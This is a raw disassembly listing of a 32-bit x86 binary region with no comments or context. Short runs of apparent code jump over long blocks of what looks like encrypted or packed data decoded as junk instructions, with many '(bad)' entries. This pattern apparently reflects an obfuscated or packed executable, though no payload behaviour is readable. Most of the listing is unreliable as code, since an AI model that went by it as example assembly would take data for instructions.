  40b522:	call   DWORD PTR ds:0x428dd8
  40b528:	sbb    DWORD PTR ds:0x4282a7,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x4281df
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x4283cb
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x4281ab
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428253
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428283
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x4282b3,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42838b,0x428253
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xffffff96
  40b596:	mov    dh,0x21
  40b598:	jle    0x40b5a4
  40b59a:	adc    ebx,DWORD PTR [eax]
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	(bad)  
  40b5a2:	addr16 xor bh,dh
  40b5a5:	mov    dl,0xe8
  40b5a7:	cmp    al,0x12
  40b5a9:	dec    BYTE PTR [ecx+0x635f97d8]
  40b5af:	inc    ebx
  40b5b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5b1:	add    esp,DWORD PTR [ebx+0x70b64371]
  40b5b7:	enter  0xa36d,0xf9
  40b5bb:	out    dx,al
  40b5bc:	adc    BYTE PTR [ebp-0x52],ch
  40b5bf:	test   DWORD PTR gs:0x23ab7b3a,0x7623d872
  40b5ca:	das    
  40b5cb:	jle    0x40b5af
  40b5cd:	adc    al,BYTE PTR [esp+ecx*4+0x58786e31]
  40b5d4:	nop
  40b5d5:	jp     0x40b636
  40b5d7:	clc    
  40b5d8:	xlat   BYTE PTR ds:[ebx]
  40b5d9:	es cld 
  40b5db:	stos   BYTE PTR es:[edi],al
  40b5dc:	inc    edx
  40b5dd:	outs   dx,DWORD PTR ds:[esi]
  40b5de:	xor    BYTE PTR [edi],0x5
  40b5e1:	mov    ecx,0x439ccc1
  40b5e6:	in     eax,dx
  40b5e7:	jo     0x40b5ee
  40b5e9:	daa    
  40b5ea:	mov    dh,0x3d
  40b5ec:	loope  0x40b598
  40b5ee:	xchg   esp,eax
  40b5ef:	jbe    0x40b62e
  40b5f1:	adc    al,0xba
  40b5f3:	adc    al,bh
  40b5f5:	mov    eax,ds:0x40aeb35f
  40b5fa:	xchg   edx,eax
  40b5fb:	ja     0x40b64c
  40b5fd:	cmp    DWORD PTR [edi+esi*8],esi
  40b600:	std    
  40b601:	popa   
  40b602:	out    0x2,al
  40b604:	iret   
  40b605:	hlt    
  40b606:	add    DWORD PTR [eax],eax
  40b608:	inc    ebp
  40b609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b60a:	dec    ecx
  40b60b:	cld    
  40b60c:	js     0x40b621
  40b60e:	lods   eax,DWORD PTR ds:[esi]
  40b60f:	jp     0x40b648
  40b611:	cmp    dh,BYTE PTR [esi+0x1d]
  40b614:	pusha  
  40b615:	into   
  40b616:	shl    BYTE PTR [ebx],1
  40b618:	mov    al,0xf2
  40b61a:	add    al,0x2f
  40b61c:	inc    eax
  40b61d:	clc    
  40b61e:	jl     0x40b690
  40b620:	xor    BYTE PTR [edx],bl
  40b622:	xchg   ecx,eax
  40b623:	and    eax,0xffb948ec
  40b628:	call   0x5a7c:0x242a448a
  40b62f:	sub    edx,esp
  40b631:	sub    DWORD PTR [ecx-0x27e959b0],edi
  40b637:	pop    esp
  40b638:	sar    DWORD PTR [edx-0x14],cl
  40b63b:	data16 jns 0x40b615
  40b63e:	jbe    0x40b657
  40b640:	pop    ecx
  40b641:	icebp  
  40b642:	add    DWORD PTR [edx+0x5d4bb002],esp
  40b648:	in     al,0x62
  40b64a:	mov    al,0x16
  40b64c:	sub    al,0x79
  40b64e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40b650:	jl     0x40b60d
  40b652:	cmp    edx,esi
  40b654:	xor    BYTE PTR [edi-0x22],dl
  40b657:	addr16 dec ebp
  40b659:	div    DWORD PTR [ebx-0x15488622]
  40b65f:	adc    eax,0xcc4ef183
  40b664:	fs cdq 
  40b666:	std    
  40b667:	repnz mov ds:0xf673893f,eax
  40b66d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b66e:	add    DWORD PTR [eax+0x51],esi
  40b671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b672:	inc    edi
  40b673:	enter  0x8e97,0xcc
  40b677:	add    ecx,DWORD PTR [ebp+0x42234f50]
  40b67d:	fs test al,0x12
  40b680:	xor    ebp,esp
  40b682:	call   0xe4429e3
  40b687:	sub    al,0x7e
  40b689:	adc    al,0xcb
  40b68b:	arpl   WORD PTR [eax+0x10],cx
  40b68e:	push   DWORD PTR [ebx]
  40b690:	mov    dh,0xc5
  40b692:	and    eax,0xa4d5d17c
  40b697:	adc    DWORD PTR [edx+0x40b35f4d],0xa65c5661
  40b6a1:	rcl    DWORD PTR [eax],0x2f
  40b6a4:	and    eax,0xbaf51c46
  40b6a9:	add    eax,0xe1b2e2d
  40b6ae:	jle    0x40b6a8
  40b6b0:	(bad)  
  40b6b1:	stos   BYTE PTR es:[edi],al
  40b6b2:	retf   0xa03d
  40b6b5:	xchg   DWORD PTR [esi+0x61],ecx
  40b6b8:	daa    
  40b6b9:	add    ebp,0x67c0d7f6
  40b6bf:	imul   esi,DWORD PTR [edi+0x73],0x31
  40b6c3:	inc    edx
  40b6c4:	push   edi
  40b6c5:	xlat   BYTE PTR ds:[ebx]
  40b6c6:	xchg   esi,eax
  40b6c7:	cmp    al,0x2f
  40b6c9:	pop    ecx
  40b6ca:	scas   eax,DWORD PTR es:[edi]
  40b6cb:	mov    al,0x51
  40b6cd:	cmp    eax,0xab74bada
  40b6d2:	jne    0x40b6ca
  40b6d4:	imul   ebx,DWORD PTR [edi+edi*8-0x8daac6e],0xa
  40b6dc:	mov    ebp,?
  40b6de:	ror    bl,cl
  40b6e0:	jo     0x40b6ca
  40b6e2:	jge    0x40b73d
  40b6e4:	fcomip st,st(2)
  40b6e6:	int3   
  40b6e7:	leave  
  40b6e8:	lds    esi,FWORD PTR [edx]
  40b6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6eb:	pushf  
  40b6ec:	loope  0x40b6b3
  40b6ee:	jmp    0x40b6df
  40b6f0:	xchg   BYTE PTR [eax+0x3dd3010d],bl
  40b6f6:	jnp    0x40b6e6
  40b6f8:	cs pop ebp
  40b6fa:	xchg   ebp,eax
  40b6fb:	dec    ecx
  40b6fc:	test   BYTE PTR [esi+0x68817721],ch
  40b702:	jge    0x40b76f
  40b704:	pop    ebp
  40b705:	sub    eax,0x1178067c
  40b70a:	mov    ebp,0x7cb70387
  40b70f:	sbb    BYTE PTR [eax+0x4bedcc0a],dl
  40b715:	push   0x41ceaed2
  40b71a:	inc    ebp
  40b71b:	int3   
  40b71c:	(bad)  
  40b71d:	es mov ebp,0x4b57b1e1
  40b723:	cmp    al,0xc1
  40b725:	addr16 mov cl,0xb
  40b728:	daa    
  40b729:	dec    ebx
  40b72a:	mov    cl,0x58
  40b72c:	inc    eax
  40b72d:	mov    ah,0x3b
  40b72f:	pop    edx
  40b730:	push   cs
  40b731:	ins    DWORD PTR es:[edi],dx
  40b732:	add    bh,BYTE PTR [ebp-0x7ac9fa4b]
  40b738:	dec    edi
  40b739:	fdivr  DWORD PTR [edi-0x7de5159a]
  40b73f:	fnstenv [ecx-0x78bb51a7]
  40b745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b746:	and    ch,ch
  40b748:	cdq    
  40b749:	and    al,0x3b
  40b74b:	addr16 (bad) 
  40b74d:	hlt    
  40b74e:	sar    bl,cl
  40b750:	loopne 0x40b74d
  40b752:	fidivr WORD PTR [esi*4-0x14ff1ab3]
  40b759:	dec    esp
  40b75a:	scas   al,BYTE PTR es:[edi]
  40b75b:	xchg   ecx,eax
  40b75c:	mov    esp,0xff057158
  40b761:	push   ebx
  40b762:	fdivrp st(3),st
  40b764:	loop   0x40b7c7
  40b766:	adc    DWORD PTR [edi],esi
  40b768:	mov    esp,DWORD PTR [edx]
  40b76a:	cmp    edi,DWORD PTR [eax-0x5e48fa48]
  40b770:	jae    0x40b75f
  40b772:	ret    
  40b773:	(bad)
  40b776:	push   ds
  40b777:	push   es
  40b778:	or     eax,0x358669d4
  40b77d:	mov    ch,0x21
  40b77f:	aad    0xc3
  40b781:	sub    DWORD PTR [ebx-0x1c],edx
  40b784:	(bad)  
  40b785:	jo     0x40b750
  40b787:	xchg   al,ah
  40b789:	fs dec edx
  40b78b:	mov    bl,0x45
  40b78d:	mov    WORD PTR [edx+0x19],ss
  40b790:	in     al,0x2d
  40b792:	ins    BYTE PTR es:[edi],dx
  40b793:	xor    BYTE PTR [eax+0x2e],0xaa
  40b797:	jg     0x40b752
  40b799:	jo     0x40b7d4
  40b79b:	adc    al,0x27
  40b79d:	hlt    
  40b79e:	and    cl,ch
  40b7a0:	stos   DWORD PTR es:[edi],eax
  40b7a1:	or     al,BYTE PTR [eax]
  40b7a3:	aas    
  40b7a4:	jnp    0x40b78f
  40b7a6:	es dec esi
  40b7a8:	cmp    al,0x8e
  40b7aa:	xchg   esp,eax
  40b7ab:	out    0x9d,al
  40b7ad:	and    ah,dl
  40b7af:	mov    cl,BYTE PTR [eax+ebx*8-0x7f]
  40b7b3:	sub    ebp,DWORD PTR [ebx]
  40b7b5:	or     esi,DWORD PTR [ebp+0x2c]
  40b7b8:	es in  eax,dx
  40b7ba:	jns    0x40b7e0
  40b7bc:	mov    ?,WORD PTR [edx+0x4]
  40b7bf:	and    BYTE PTR [edx-0x6a],bl
  40b7c2:	dec    esp
  40b7c3:	nop
  40b7c4:	xchg   DWORD PTR [esi+ebx*4+0x27],esi
  40b7c8:	add    al,0x17
  40b7ca:	xchg   edi,eax
  40b7cb:	int3   
  40b7cc:	mov    eax,ds:0x2815360f
  40b7d1:	lock cmp al,0xc7
  40b7d4:	loopne 0x40b77f
  40b7d6:	pop    esi
  40b7d7:	sbb    eax,0xdab436df
  40b7dc:	outs   dx,BYTE PTR ss:[esi]
  40b7de:	arpl   WORD PTR [ebx-0x19ced369],ax
  40b7e4:	out    dx,al
  40b7e5:	add    DWORD PTR [eax+esi*4],eax
  40b7e8:	or     BYTE PTR [edi+0x40e47461],ah
  40b7ee:	sbb    al,0xd4
  40b7f0:	adc    eax,0x98998037
  40b7f5:	arpl   WORD PTR [eax],dx
  40b7f7:	cwde   
  40b7f8:	inc    eax
  40b7f9:	(bad)  
  40b7fa:	xor    al,0xc0
  40b7fc:	in     al,dx
  40b7fd:	pop    DWORD PTR [eax+0xb01f5db]
  40b803:	repnz in al,0xc3
  40b806:	dec    edi
  40b807:	data16 loopne 0x40b7a2
  40b80a:	jge    0x40b820
  40b80c:	push   edx
  40b80d:	retf   0xe878
  40b810:	add    al,0xf0
  40b812:	cmp    eax,0x9726db8b
  40b817:	out    0x39,eax
  40b819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b81a:	imul   edi,DWORD PTR [edi],0xb158a239
  40b820:	push   cs
  40b821:	mov    ecx,0x40598caf
  40b826:	mov    ah,0x32
  40b828:	mov    ds:0x20aac971,eax
  40b82d:	loope  0x40b8ac
  40b82f:	and    bl,ch
  40b831:	fisubr DWORD PTR [edx+0x0]
  40b834:	mov    edx,0xa228fd9c
  40b839:	fsub   st,st(2)
  40b83b:	into   
  40b83c:	dec    eax
  40b83d:	(bad)  
  40b83e:	xor    al,0xfa
  40b840:	xchg   bl,ah
  40b842:	fwait
  40b843:	jmp    0x17fc:0x95f35d85
  40b84a:	retf   0x9f9e
  40b84d:	xchg   edi,eax
  40b84e:	outs   dx,BYTE PTR ds:[esi]
  40b84f:	fistp  DWORD PTR [edi-0x7959752d]
  40b855:	out    dx,al
  40b856:	push   edi
  40b857:	dec    esi
  40b858:	fsubr  st,st(6)
  40b85a:	pop    ds
  40b85b:	popf   
  40b85c:	inc    ecx
  40b85d:	fisub  WORD PTR cs:[ebx+edi*2+0x3]
  40b862:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b864:	hlt    
  40b865:	jle    0x40b841
  40b867:	sub    ebx,DWORD PTR [ecx+ebp*4]
  40b86a:	out    0xab,eax
  40b86c:	and    ecx,0x97656452
  40b872:	aaa    
  40b873:	xchg   esi,eax
  40b874:	aam    0x9
  40b876:	jo     0x40b854
  40b878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b879:	dec    ebp
  40b87a:	shl    BYTE PTR [esi],cl
  40b87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b87d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b87e:	ret    0xc427
  40b881:	add    eax,0xcd21294e
  40b886:	stos   DWORD PTR es:[edi],eax
  40b887:	pop    esi
  40b888:	ds shl edx,0x4e
  40b88c:	pop    ds
  40b88d:	std    
  40b88e:	retf   0x71f8
  40b891:	inc    ebp
  40b892:	adc    eax,0x466a5561
  40b897:	pop    ds
  40b898:	mov    ch,BYTE PTR [eax-0x1f0053b7]
  40b89e:	int    0x36
  40b8a0:	xor    BYTE PTR [ebx-0x1],bh
  40b8a3:	jne    0x40b89a
  40b8a5:	out    dx,al
  40b8a6:	call   0x20a1:0x49571473
  40b8ad:	sbb    dl,ch
  40b8af:	test   al,0xf5
  40b8b1:	sbb    al,0x8a
  40b8b3:	add    ecx,DWORD PTR [esi+ecx*8+0x50e7afef]
  40b8ba:	cmp    cl,bl
  40b8bc:	int    0x1f
  40b8be:	xchg   ebp,eax
  40b8bf:	fs xchg edi,eax
  40b8c1:	jae    0x40b8fe
  40b8c3:	sub    al,0x9c
  40b8c5:	sub    DWORD PTR [esi*2-0x68aa9f12],edi
  40b8cc:	jns    0x40b8e2
  40b8ce:	sbb    BYTE PTR [esi-0x62f70bfe],al
  40b8d4:	adc    BYTE PTR [ebp+0x521e9656],0xfb
  40b8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8dc:	les    ebx,FWORD PTR [eax+0x166d632b]
  40b8e2:	int    0x7c
  40b8e4:	fwait
  40b8e5:	mov    ds:0xe7c68461,eax
  40b8ea:	scas   eax,DWORD PTR es:[edi]
  40b8eb:	mov    ah,0x7f
  40b8ed:	imul   BYTE PTR [ecx-0x60]
  40b8f0:	cwde   
  40b8f1:	jo     0x40b926
  40b8f3:	mov    BYTE PTR [esi],ch
  40b8f5:	jne    0x40b907
  40b8f7:	jp     0x40b892
  40b8f9:	repz ret 
  40b8fb:	jb     0x40b8c2
  40b8fd:	loope  0x40b87f
  40b8ff:	test   DWORD PTR [esi+eiz*4-0x4a],eax
  40b903:	or     BYTE PTR [ebp+edx*1-0x15563f20],dh
  40b90a:	jmp    0x8556:0xe483585b
  40b911:	adc    edi,DWORD PTR [ebp-0x5f013cdf]
  40b917:	rep stos DWORD PTR es:[edi],eax
  40b919:	inc    esi
  40b91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b91b:	inc    DWORD PTR [ecx+0x1]
  40b91e:	(bad)  
  40b91f:	call   0xe5be:0xd6f5e006
  40b926:	or     eax,esp
  40b928:	mov    eax,0xb04cd703
  40b92d:	pop    esi
  40b92e:	popf   
  40b92f:	arpl   WORD PTR [edi+0x43],ax
  40b932:	and    esp,DWORD PTR [ecx+0x3d620537]
  40b938:	repz leave 
  40b93a:	mul    dl
  40b93c:	mov    eax,0x43dcb5d2
  40b941:	mov    esi,0x234e8ead
  40b946:	push   edx
  40b947:	mov    dl,0x9b
  40b949:	fidivr DWORD PTR [ebp+0x50]
  40b94c:	mov    bl,0x74
  40b94e:	pop    esp
  40b94f:	add    eax,0xf1acb454
  40b954:	mov    ds:0xf970b0e8,eax
  40b959:	popa   
  40b95a:	mov    bl,0x98
  40b95c:	xchg   esp,eax
  40b95d:	xchg   edi,eax
  40b95e:	mov    ecx,0x8900925e
  40b963:	sbb    ebx,ecx
  40b965:	es fcmovne st,st(3)
  40b968:	sbb    DWORD PTR [eax+eiz*1+0x5eecf9ae],ebx
  40b96f:	pusha  
  40b970:	sar    DWORD PTR [ecx-0x588b79c0],1
  40b976:	and    al,0x17
  40b978:	or     eax,0x355c0531
  40b97d:	add    BYTE PTR [eax],al
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x428303,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428287
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428317,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42831f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428287,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42831f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x4283af,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42831f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428ddc
  40b9f7:	adc    DWORD PTR ds:0x4283ab,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x428307
  40ba0a:	sub    edx,DWORD PTR ds:0x42831b
  40ba10:	mov    DWORD PTR ds:0x428307,edx
  40ba16:	adc    DWORD PTR ds:0x428303,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428177
  40ba26:	xor    DWORD PTR ds:0x4283a3,edx
  40ba2c:	or     DWORD PTR ds:0x42824f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428287
  40ba3c:	or     DWORD PTR ds:0x428323,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	int    0x6e
  40baa5:	pop    ebp
  40baa6:	jo     0x40bb08
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	scas   eax,DWORD PTR es:[edi]
  40bab0:	test   BYTE PTR [edi],bl
  40bab2:	cs int 0x7
  40bab5:	push   ss
  40bab6:	cmp    eax,0x27ad0bd1
  40babb:	ins    BYTE PTR es:[edi],dx
  40babc:	mov    BYTE PTR [eax+ebp*1],dh
  40babf:	imul   edx,esp,0x15
  40bac2:	lahf   
  40bac3:	dec    edx
  40bac4:	lock inc eax
  40bac6:	je     0x40bb34
  40bac8:	icebp  
  40bac9:	fisttp QWORD PTR [ebp+eiz*1-0x2308a59f]
  40bad0:	and    dh,BYTE PTR [ecx-0x23be4022]
  40bad6:	jmp    0x7881:0xe3fd1842
  40badd:	sar    DWORD PTR [esi],cl
  40badf:	mov    esi,0x70542df
  40bae4:	lods   al,BYTE PTR ds:[esi]
  40bae5:	xchg   edx,eax
  40bae6:	(bad)  
  40bae7:	push   ebx
  40bae8:	outs   dx,BYTE PTR ds:[esi]
  40bae9:	jge    0x40bb07
  40baeb:	(bad)  
  40baed:	addr16 out dx,eax
  40baef:	xor    al,0x7a
  40baf1:	mov    eax,ds:0x1a0a2ac7
  40baf6:	jbe    0x40bb2d
  40baf8:	adc    eax,0xbf7fceff
  40bafd:	or     al,0x6b
  40baff:	leave  
  40bb00:	(bad)  
  40bb01:	and    al,0x72
  40bb03:	cmp    al,BYTE PTR [ecx-0x3718812e]
  40bb09:	dec    DWORD PTR [ebx+0x6bd7028b]
  40bb0f:	mov    eax,0x29549d85
  40bb14:	fs popa 
  40bb16:	test   BYTE PTR [ecx],ch
  40bb18:	sbb    eax,0x100233ed
  40bb1d:	std    
  40bb1e:	rcl    DWORD PTR [edx+0x59],cl
  40bb21:	push   ebx
  40bb22:	into   
  40bb23:	adc    esi,edi
  40bb25:	scas   eax,DWORD PTR es:[edi]
  40bb26:	mov    dh,0x84
  40bb28:	repz dec ecx
  40bb2a:	jb     0x40bba6
  40bb2c:	push   ss
  40bb2d:	sbb    ecx,DWORD PTR [ecx-0x6281ffc4]
  40bb33:	loop   0x40bad2
  40bb35:	jge    0x40bba7
  40bb37:	repnz add eax,DWORD PTR [eax+0x46]
  40bb3b:	pop    edx
  40bb3c:	xchg   edx,eax
  40bb3d:	add    al,0xff
  40bb3f:	fwait
  40bb40:	arpl   bp,bx
  40bb42:	mov    al,0x9b
  40bb44:	mov    ah,0xe0
  40bb46:	fidiv  DWORD PTR cs:[ebx+0x3a4ddb21]
  40bb4d:	sbb    DWORD PTR [ecx+edi*8],ebx
  40bb50:	ds in  al,0xca
  40bb53:	pop    ss
  40bb54:	lea    eax,[edi-0x15]
  40bb57:	pop    esp
  40bb58:	clc    
  40bb59:	shr    DWORD PTR [edi+0x36287bb8],1
  40bb5f:	inc    ebx
  40bb60:	jb     0x40bb3c
  40bb62:	pop    esp
  40bb63:	and    ebx,ebx
  40bb65:	ins    DWORD PTR es:[edi],dx
  40bb66:	and    eax,0xd0f01837
  40bb6b:	out    0x84,eax
  40bb6d:	fiadd  DWORD PTR [ecx+0x1866fce9]
  40bb73:	xchg   ebp,eax
  40bb74:	je     0x40bb4c
  40bb76:	mov    ebx,0xd69171a1
  40bb7b:	push   ss
  40bb7c:	rcl    BYTE PTR [ebp-0x23],1
  40bb7f:	repz mov ch,0x66
  40bb82:	in     al,dx
  40bb83:	nop
  40bb84:	mov    eax,0x20ac5d64
  40bb89:	cmp    edx,ecx
  40bb8b:	ins    DWORD PTR es:[edi],dx
  40bb8c:	cwde   
  40bb8d:	(bad)  
  40bb8f:	and    ebx,edx
  40bb91:	mov    edi,DWORD PTR [ebx]
  40bb93:	xor    dh,al
  40bb95:	int    0x8d
  40bb97:	cwde   
  40bb98:	call   0xa97b8eaa
  40bb9d:	data16 xor cl,ah
  40bba0:	push   edx
  40bba1:	pop    eax
  40bba2:	add    al,0xfa
  40bba4:	pop    ss
  40bba5:	fstp   DWORD PTR [edi-0x5c]
  40bba8:	jae    0x40bbb8
  40bbaa:	pop    edi
  40bbab:	jge    0x40bb2f
  40bbad:	jb     0x40bc05
  40bbaf:	or     eax,DWORD PTR [ebp-0x474bd8e2]
  40bbb5:	adc    al,BYTE PTR [edi-0x16641964]
  40bbbb:	in     al,0x3
  40bbbd:	or     dh,ah
  40bbbf:	sbb    BYTE PTR [edx-0x19d6e067],bh
  40bbc5:	and    ch,BYTE PTR [eax+0x504dde6e]
  40bbcb:	les    edi,FWORD PTR [edx-0x6e46af6d]
  40bbd1:	das    
  40bbd2:	push   ss
  40bbd3:	out    0xe1,eax
  40bbd5:	leave  
  40bbd6:	data16 cmp bh,BYTE PTR [edi-0x6ff6204c]
  40bbdd:	cld    
  40bbde:	or     al,0x4a
  40bbe0:	loope  0x40bb68
  40bbe2:	pop    edx
  40bbe3:	push   esp
  40bbe4:	cdq    
  40bbe5:	(bad)  
  40bbe6:	(bad)  
  40bbe7:	cmp    al,al
  40bbe9:	xchg   ebx,eax
  40bbea:	pop    es
  40bbeb:	adc    eax,0xd3f3bb39
  40bbf0:	add    ebx,DWORD PTR [ebx+0x1b1d1d70]
  40bbf6:	daa    
  40bbf7:	popa   
  40bbf8:	lahf   
  40bbf9:	mov    eax,gs
  40bbfb:	xchg   edx,eax
  40bbfc:	pop    edx
  40bbfd:	std    
  40bbfe:	fadd   QWORD PTR [edi*4-0x7f0d7481]
  40bc05:	sbb    eax,0x97cbe08e
  40bc0a:	push   ds
  40bc0b:	fidivr DWORD PTR [edi+0x74]
  40bc0e:	sbb    eax,0xaca1f287
  40bc13:	xor    BYTE PTR [edx-0xa],al
  40bc16:	lods   al,BYTE PTR ds:[esi]
  40bc17:	push   ecx
  40bc18:	call   0xc2e:0x44f07697
  40bc1f:	add    eax,0x92b8647e
  40bc24:	(bad)  
  40bc25:	mov    ch,0xd5
  40bc27:	mov    cl,0x76
  40bc29:	fs cwde 
  40bc2b:	sub    bl,BYTE PTR [ecx-0x46f8c8cb]
  40bc31:	ins    BYTE PTR es:[edi],dx
  40bc32:	hlt    
  40bc33:	shl    BYTE PTR [esp+ebp*2-0x53],0xa
  40bc38:	push   ds
  40bc39:	xor    BYTE PTR [ebp-0x1a],0x4a
  40bc3d:	push   ebx
  40bc3e:	pop    ebp
  40bc3f:	pop    es
  40bc40:	xchg   ebp,eax
  40bc41:	loope  0x40bbed
  40bc43:	rcr    DWORD PTR [eax+eiz*1-0x12],0xb
  40bc48:	jecxz  0x40bbf6
  40bc4a:	(bad)  
  40bc4b:	les    ebp,FWORD PTR [ebx-0x11a071b4]
  40bc51:	rol    DWORD PTR [esp+eax*1],0x72
  40bc55:	or     DWORD PTR [eax+0xcbd302d],ebp
  40bc5b:	test   DWORD PTR [eax+0x349b0911],ecx
  40bc61:	inc    esp
  40bc62:	es cs mov ecx,edx
  40bc66:	dec    ecx
  40bc67:	inc    ebp
  40bc68:	(bad)  
  40bc69:	pop    ebp
  40bc6a:	std    
  40bc6b:	and    dh,BYTE PTR [edi]
  40bc6d:	inc    ebx
  40bc6e:	inc    edx
  40bc6f:	mov    ch,0x2d
  40bc71:	in     eax,dx
  40bc72:	aam    0xe8
  40bc74:	ror    DWORD PTR [ebx+0x21932113],1
  40bc7a:	(bad)  
  40bc7b:	xor    ebp,edx
  40bc7d:	lods   eax,DWORD PTR ds:[esi]
  40bc7e:	rcl    DWORD PTR [edi],0xb7
  40bc81:	jg     0x40bcde
  40bc83:	rol    DWORD PTR [edx-0x62],1
  40bc86:	mov    ah,0x40
  40bc88:	inc    eax
  40bc89:	jmp    0x40bc65
  40bc8b:	ins    BYTE PTR es:[edi],dx
  40bc8c:	lods   eax,DWORD PTR ds:[esi]
  40bc8d:	mov    bh,0x6f
  40bc8f:	push   ebp
  40bc90:	xchg   cl,dl
  40bc92:	mov    bh,0x7d
  40bc94:	pop    ss
  40bc95:	inc    esi
  40bc96:	sbb    ebx,ecx
  40bc98:	outs   dx,BYTE PTR ds:[esi]
  40bc99:	jo     0x40bc25
  40bc9b:	mov    ebp,0xccd741ac
  40bca0:	lahf   
  40bca1:	push   esi
  40bca2:	ror    BYTE PTR [ecx+0x4acebb02],cl
  40bca8:	xor    esp,DWORD PTR [edx]
  40bcaa:	or     bl,cl
  40bcac:	add    BYTE PTR [eax],dh
  40bcae:	retf   0x34b2
  40bcb1:	dec    ebx
  40bcb2:	cdq    
  40bcb3:	es push es
  40bcb5:	shr    BYTE PTR [edx+0x2b],0xb3
  40bcb9:	dec    ecx
  40bcba:	mov    ch,0x2c
  40bcbc:	and    ecx,ebp
  40bcbe:	or     eax,0x68a33266
  40bcc3:	mov    esi,ss
  40bcc5:	mov    ch,0x38
  40bcc7:	pop    eax
  40bcc8:	repz and ch,BYTE PTR [eax+0x4e820add]
  40bccf:	out    dx,eax
  40bcd0:	fidiv  DWORD PTR [edx]
  40bcd2:	pop    eax
  40bcd3:	in     eax,dx
  40bcd4:	pop    esp
  40bcd5:	pop    edx
  40bcd6:	pop    ebp
  40bcd7:	scas   eax,DWORD PTR es:[edi]
  40bcd8:	pop    esi
  40bcd9:	iret   
  40bcda:	imul   edi,DWORD PTR [eax-0x4],0xffffffd9
  40bcde:	push   0x70
  40bce0:	ds sti 
  40bce2:	mov    ebx,0x81ad480c
  40bce7:	stc    
  40bce8:	pop    ds
  40bce9:	push   ds
  40bcea:	call   0x4793:0x550eb355
  40bcf1:	lods   al,BYTE PTR ds:[esi]
  40bcf2:	fadd   QWORD PTR [edx+eax*2]
  40bcf5:	pop    eax
  40bcf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcf7:	xor    eax,0xaa8dc77c
  40bcfc:	sbb    bh,ah
  40bcfe:	pop    ds
  40bcff:	jb     0x40bca1
  40bd01:	fisubr DWORD PTR [edi+0x50fa2a0]
